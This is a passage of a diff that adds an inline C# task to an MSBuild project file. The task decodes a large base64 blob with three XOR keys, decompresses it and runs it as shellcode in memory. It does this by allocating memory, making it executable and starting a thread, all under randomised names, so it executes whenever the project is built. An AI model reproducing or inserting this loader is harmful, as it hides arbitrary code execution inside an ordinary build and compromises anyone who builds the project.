rTf87nkUioIaOaCokYlAq/6CTYCAfpO/euvaBeqgUGTeJE5U2pcXyetSHFoIFz6Wv0omk1vo7N2B9fFiyrtlARVt1Btcowg6mEBDb1nd6VOBB0sovg+xFo6bx1+KzRxkpHkzV1kmMiDmQZInVLM67iT2SMdkWZ2t0OuZj1OOF3S8NR6i9aePJ+oZCo9Mx/fvpwOuczVsdc7N1wH+IamJ+Mrx75hfRA2WiALb51s55csqKxcD9ER5sxfZo+S8wh8k/j2B0FrQvKHSwo+P8b5pB4W/FA9CUG3EpByQEI6PWkzdv/E0JFPoF+ot8IT0IqNZhHE+xnooeQtPnXbEFZlr1IwwXU33/PlUo+lDiOOgZIymEs/tcPNCLRCBIw7XhkQv6FJFKvOOsSGDYaZNFvSr3edxK+Fvp4iYH/o8RxRS8zhGZm87ns50IM9REb5tgHAvvpvV0ad8Ln3JzIwl1QVFUr+3vF+Nepo4zUgw5Ix4oMwzIHcgqTqCFc24wr8aR7xH3li5xdxFGMgIpqMrQE602dwZ33I7KVi5+VIJDeHAkL0b8hkfzbe6XP/bia2r4XAP8RoCQ2tyHqc4QHFqno8h2rusP2+opKkTvOa+gbOLneOMUd6n4tLHvZKc6B1ueyJQVriKXliNXu4WXn6vkM4AqO1wf4TJp8FvJ3/vE/I8KcZoH4l0UJvU/W4p7sm01jMVDa0zvJW4hMQvRIoKJ90iTuu5tg/7GnGBV6L6JKvbd7SFX1HOMpIEEritl53ILZjJ+Y/SWsIhfOlW9e0XVP7hRJYZUaAAcoFsHfVMmtIvBhPYjlkn55kXmw/fqGSoHaeE/ImYeSE9KYe6lPlnKYguv6IxpHMI9KAyKmhWuEm5ACFbxMCPs3AEZSLSsT/ewBS1n3Fz6h2KYKAVe6uNW13yNLFKM4WfTUvn/rgwr7YCTYLFCdFQBJUt+fGJDxLSqMqZvTf5LmNZr52kaF4+kBUyDpPH7SKEJShnlXikqwb07dbFIQ+/QIEW39Ne2warhTFnjHM7APOVRdEa7wqKR/rTq15KFzk3dksPk6CH1yXZWL7fdRvB3vX0diw7dXk");var tvBCa=System.Convert.FromBase64String("fO7qKCaDAG8z6xX49t/fxNWw3J6jLKFAi/bffS+NfEA=");var mXILn=System.Convert.FromBase64String("f7NDjCsfhKA5tDbuo7sT/JWKfOCZsnLEuY1jvKoriKI=");var XPLkw=System.Convert.FromBase64String("G9UMO7DqWxrujrhqkEM3+j9052OzA49+8eJje6kk3mo=");for(int DN=0;DN<rZK76y.Length;DN++){rZK76y[DN]^=tvBCa[DN%32];}for(int DN=0;DN<rZK76y.Length;DN++){rZK76y[DN]^=mXILn[DN%32];}for(int DN=0;DN<rZK76y.Length;DN++){rZK76y[DN]^=XPLkw[DN%32];}var Q7Ka=new System.IO.MemoryStream();using(var DuXU=new System.IO.Compression.GZipStream(new System.IO.MemoryStream(rZK76y),System.IO.Compression.CompressionMode.Decompress))DuXU.CopyTo(Q7Ka);rZK76y=Q7Ka.ToArray();var tAsqI=Bz4IEXL(System.IntPtr.Zero,(uint)rZK76y.Length,0x3000u,0x04u);System.Runtime.InteropServices.Marshal.Copy(rZK76y,0,tAsqI,rZK76y.Length);uint saS=0;N9mf9U5(tAsqI,(uint)rZK76y.Length,0x20u,out saS);VwZvEUB(oO0gcXo(System.IntPtr.Zero,0u,tAsqI,System.IntPtr.Zero,0u,System.IntPtr.Zero),0xFFFFFFFFu);return true;}]]></Code>
+    </Task>
+  </UsingTask>
+  <Target Name="CpF0Ep5DZY">
+    <j8DNINyz1G />
+  </Target>
+</Project>
